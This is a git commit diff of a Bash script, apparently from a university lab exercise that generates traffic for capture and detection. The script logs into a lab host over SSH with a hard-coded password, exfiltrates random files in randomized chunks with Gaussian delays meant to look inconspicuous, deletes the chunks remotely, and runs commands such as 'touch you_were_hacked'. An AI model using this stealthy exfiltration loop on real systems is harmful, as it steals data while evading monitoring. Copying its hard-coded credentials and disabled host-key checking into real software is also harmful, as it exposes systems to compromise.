55a1b4b38f5de8c514ecdb31a5fc07ab60aa1a6d
Marta Oliveira <marta.alex@ua.pt>
2023-12-15 20:02:53 +0000

    captura script smart e features

--- script_smart.sh
+++ script_smart.sh
@@ -1,72 +1,80 @@
+#!/bin/bash
+
 remote_user="labcom"
 remote_host="10.10.10.1"
-remote_path="~/Desktop/"
+remote_path="~/Desktop/files" # Diretório remoto a ser acessado
 remote_password="labcom"
+
 # Lista de comandos possíveis
-commands=("ls" "mkdir" "nano" "echo" "pwd" "date" "cat" "grep" "touch" "whoami","lscpu","netstat","ip a","traceroute")
+commands=("ls" "echo OLA" "pwd" "date" "grep" "touch you_were_hacked" "whoami" "lscpu" "netstat" "ip a" "traceroute")
 
 while true; do
 
-        #gerar ficheiros de 100 KB e 100000 KB (0.1 mb e 100mb)
-        file_size_kb=$(( ( RANDOM % 99501 ) + 100 ))
+    # Acessar aleatoriamente um arquivo no diretório remoto
+    remote_files=( $(sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "cd $remote_path && ls -p | grep -v /") )
 
-    # se o ficheiro for pequeno entre 50kb e 250 kb
-    if [ "$file_size_kb" -ge 50 ] && [ "$file_size_kb" -le 250 ]; then
-        file_name="example${file_size_kb}KB.txt"
-        dd if=/dev/urandom of="$file_name" bs=1024 count="$file_size_kb" 2>/dev/null
-        echo "Transferring $file_name..."
-        sshpass -p "$remote_password" scp -o StrictHostKeyChecking=no "$file_name" "$remote_user"@"$remote_host":"$remote_path"
-        echo "File $file_name transferred."
-        rm "$file_name"
-    fi
-    # se for grande vai dividir em chunks 
+    # Verificar se há arquivos disponíveis no diretório remoto
+    if [ ${#remote_files[@]} -eq 0 ]; then
+        echo "Nenhum arquivo encontrado no diretório remoto."
     else
-        chunk_size=$(( ( RANDOM % 200 ) + 50 )) # Random chunk size between 50KB and 250KB
-        file_name="example${file_size_kb}KB.txt"
-        dd if=/dev/urandom of="$file_name" bs=1024 count="$file_size_kb" 2>/dev/null
-        split -b "${chunk_size}K" "$file_name" "$file_name-part" # Splitting the file into chunks
-        rm "$file_name" # Remove the original file
+        # Selecionar aleatoriamente um arquivo do array de arquivos remotos
+        random_index=$(( RANDOM % ${#remote_files[@]} ))
+        selected_file="${remote_files[$random_index]}"
         
-        chunks=( $(ls "$file_name"-part*) ) # List of chunks
+        # Obter o tamanho do arquivo selecionado
+        file_size=$(sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "cd $remote_path && du -k $selected_file | cut -f1")
         
-        # Randomly shuffle chunks
-        for ((i = ${#chunks[@]} - 1; i > 0; i--)); do
-            j=$((RANDOM % (i + 1)))
-            temp="${chunks[i]}"
-            chunks[i]="${chunks[j]}"
-            chunks[j]="$temp"
-        done
-        
-        for chunk in "${chunks[@]}"; do
-            echo "Transferring $chunk..."
-            sshpass -p "$remote_password" scp -o StrictHostKeyChecking=no "$chunk" "$remote_user"@"$remote_host":"$remote_path"
-            echo "Chunk $chunk transferred."
-            rm "$chunk"
+		if [ "$file_size" -gt 50 ]; then
+			echo "File $selected_file is larger than 50KB, transferring in chunks..."
+				
+			# Generate a random number between 10 and 16 for split size
+			random_size=$(( (RANDOM % 7) + 10 ))
 
-            
-            # Random gaussian delay between copies
-            mean=85
-            deviation=70
-            delay=$(python -c "import random, math; print(int(random.gauss($mean, $deviation)))")
-            sleep "$delay"
-        done
+			# Execute the SSH command with the generated random size
+			ssh_command="cd $remote_path && split -d -b ${random_size}k $selected_file $selected_file-part"
+			sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "$ssh_command" 2>/dev/null
+
+			# Get the list of chunks
+			chunks=( $(sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "cd $remote_path && ls $selected_file-part* 2>/dev/null") )
+
+			# Transfer each chunk and remove it from the remote server after transfer
+			for chunk in "${chunks[@]}"; do
+				echo "Transferring chunk $chunk..."
+				sshpass -p "$remote_password" scp -o StrictHostKeyChecking=no "$remote_user"@"$remote_host":"$remote_path/$chunk" .
+				echo "Chunk $chunk transferred."
+				sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "cd $remote_path && rm $chunk"
+
+				# Insert random delay between chunk transfers
+				mean_chunk_delay=30
+				deviation_chunk_delay=20
+				chunk_delay=$(python -c "import random, math; print(int(random.gauss($mean_chunk_delay, $deviation_chunk_delay)))")
+				sleep "$chunk_delay"
+			done
+	
+        else
+            # Transferir o arquivo completo se for menor ou igual a 50KB
+            echo "Transferring $selected_file..."
+            sshpass -p "$remote_password" scp -o StrictHostKeyChecking=no "$remote_user"@"$remote_host":"$remote_path/$selected_file" .
+            echo "File $selected_file transferred."
+        fi
+
+		#
+		num_commands=$(( (RANDOM % 2) + 3 ))
+
+		# Execute random commands within the specified range
+		for (( i=1; i<=num_commands; i++ )); do
+			random_command=${commands[$RANDOM % ${#commands[@]} ]}
+			echo "Executing command remotely: $random_command"
+			sshpass -p "$remote_password" ssh -o StrictHostKeyChecking=no "$remote_user"@"$remote_host" "$random_command"
+			mean_command_delay=10
+			deviation_command_delay=5
+			command_delay=$(python -c "import random, math; print(int(random.gauss($mean_command_delay, $deviation_command_delay)))")
+			sleep "$command_delay"
+		done
     fi
-
-
- # Execute a random number of commands (4 to 5) with Gaussian delays(mean 2, desv 1 )
-    num_commands=$(( ( RANDOM % 2 ) + 4 )) # Random number of commands
-    for (( i=1; i<=num_commands; i++ )); do
-        random_command=${commands[$RANDOM % ${#commands[@]} ]}
-        echo "Executing command: $random_command"
-        eval "$random_command"
-        mean_command_delay=2
-        deviation_command_delay=1
-        command_delay=$(python -c "import random, math; print(int(random.gauss($mean_command_delay, $deviation_command_delay)))")
-        sleep "$command_delay"
-    done
     
-    # Gaussian delay between attacks ( with a mean of 120 seconds and a deviation of 60 seconds)
-    mean_sleep_delay=120
+    # Atraso gaussiano entre ataques (com média de 90 segundos e desvio de 60 segundos)
+    mean_sleep_delay=90
     deviation_sleep_delay=60
     attack_delay=$(python -c "import random, math; print(int(random.gauss($mean_sleep_delay, $deviation_sleep_delay)))")
     sleep "$attack_delay"
